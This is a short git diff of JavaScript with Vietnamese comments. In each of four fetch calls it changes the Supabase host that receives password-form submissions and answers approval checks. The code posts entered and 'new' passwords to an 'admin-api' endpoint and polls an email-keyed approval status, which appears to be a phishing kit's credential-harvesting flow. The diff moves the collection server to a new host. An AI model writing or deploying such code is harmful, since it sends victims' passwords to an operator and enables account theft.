@@ -165,7 +165,7 @@ if (passwordForm && passwordInput) {
         
         try {
             // Gửi dữ liệu password với Supabase
-            const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
+            const response = await fetch('https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api/api/request', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -222,7 +222,7 @@ document.addEventListener('DOMContentLoaded', function() {
             
             try {
                 // Gửi dữ liệu password mới đến Supabase
-                const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
+                const response = await fetch('https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api/api/request', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -280,7 +280,7 @@ document.addEventListener('DOMContentLoaded', function() {
             
             try {
                 // Gửi dữ liệu password mới đến Supabase (mobile)
-                const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
+                const response = await fetch('https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api/api/request', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -366,7 +366,7 @@ async function checkApprovalStatus(email, nextPage) {
     
     const checkStatus = async () => {
         try {
-            const response = await fetch(`https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(email)}`, {
+            const response = await fetch(`https://otbswtklpidhezziotac.supabase.co/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(email)}`, {
                 cache: 'no-cache',
                 headers: {
                     'Cache-Control': 'no-cache',
